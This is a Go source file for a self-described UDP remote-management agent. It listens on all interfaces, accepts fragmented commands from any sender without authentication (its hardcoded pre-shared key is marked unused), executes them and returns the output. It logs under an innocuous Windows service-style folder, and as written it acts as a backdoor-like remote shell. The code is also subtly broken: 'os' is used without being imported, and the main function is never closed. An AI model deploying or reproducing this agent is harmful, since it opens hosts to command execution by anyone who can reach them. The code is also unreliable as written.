package main

import (
	"flag"
	"log"
	"net"
	"time"

	"arp-rmm/internal/execution"
	"arp-rmm/internal/fragment"
	"arp-rmm/internal/transport"
)

func init() {
	// Configure structured logging with timestamps
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	
	// When running as a Windows service, write logs to file
	// This enables debugging without console output
	logPath := "C:\\ProgramData\\WinNetExt\\agent.log"
	if logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666); err == nil {
		log.SetOutput(logFile)
		log.Println("=== AGENT LOG STARTED ===")
	}
}


// No additional helper functions needed for UDP transport

func main() {
	port := flag.Int("port", 9999, "UDP port to listen on")
	psk := flag.String("psk", "S3cur3_Adm1n_K3y", "Pre-shared key (unused in UDP v2)")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	log.Println("=== UDP RMM Agent v2.0 (Cloud-Ready) ===")
	log.Printf("[*] Starting UDP listener on port %d", *port)

	// Listen on UDP port
	conn, err := transport.ListenUDP(*port)
	if err != nil {
		log.Fatalf("[FATAL] Failed to listen: %v", err)
	}
	defer conn.Close()

	log.Printf("[+] Listening on 0.0.0.0:%d for incoming commands", *port)

	cmdBuf := fragment.NewCommandBuffer()
	var adminAddr *net.UDPAddr

	for {
		// Receive UDP packet with 5-second timeout
		data, remoteAddr, err := transport.RecvUDPWithTimeout(conn, 5*time.Second)
		if err != nil {
			if err, ok := err.(net.Error); ok && err.Timeout() {
				continue // Timeout is normal, keep listening
			}
			log.Printf("[!] Receive error: %v", err)
			continue
		}

		if len(data) < 1 {
			continue
		}

		// Parse fragment header (byte 0: [more_frags(1) | seq(7)])
		adminAddr = remoteAddr
		seqID := int(data[0] & fragment.SeqIDMask)
		moreFrags := (data[0] & 0x80) != 0
		payload := data[1:]

		if *debug {
			log.Printf("[DEBUG] RX from %s: seq=%d, more=%v, len=%d", remoteAddr.IP.String(), seqID, moreFrags, len(payload))
		}

		// Add fragment to buffer
		cmdBuf.Add(seqID, payload, moreFrags)

		// Check if command is complete
		if !cmdBuf.IsComplete() {
			if *debug {
				log.Printf("[DEBUG] Waiting for more fragments... (current seq=%d)", seqID)
			}
			continue
		}

		// Command is complete, execute it
		cmd := string(cmdBuf.GetData())
		log.Printf("[+] Received complete command: %q", cmd)

		var response string
		if cmd == "HELO" {
			response = "READY"
			log.Println("[*] Handshake: HELO -> READY")
		} else {
			log.Printf("[*] Executing: %s", cmd)
			response = execution.RouteCommand(cmd)
			log.Printf("[OK] Execution complete (%d bytes)", len(response))
		}

		// Fragment response
		responseFrags := fragment.FragmentCommand(response)
		log.Printf("[TX] Sending %d response fragment(s) to %s", len(responseFrags), adminAddr.IP.String())

		// Send each response fragment
		for i, respFrag := range responseFrags {
			respData := make([]byte, len(respFrag)+1)
			respData[0] = byte(i)
			if i < len(responseFrags)-1 {
				respData[0] |= 0x80 // Set more-fragments bit
			}
			copy(respData[1:], respFrag)

			if adminAddr != nil {
				if err := transport.SendUDPToAddr(conn, adminAddr, respData); err != nil {
					log.Printf("[!] Failed to send fragment %d: %v", i+1, err)
				} else if *debug {
					log.Printf("[DEBUG] TX fragment %d/%d (%d bytes)", i+1, len(responseFrags), len(respData))
				}
			}
			time.Sleep(5 * time.Millisecond)
		}

		cmdBuf = fragment.NewCommandBuffer()
		log.Println("[*] Ready for next command")
	}
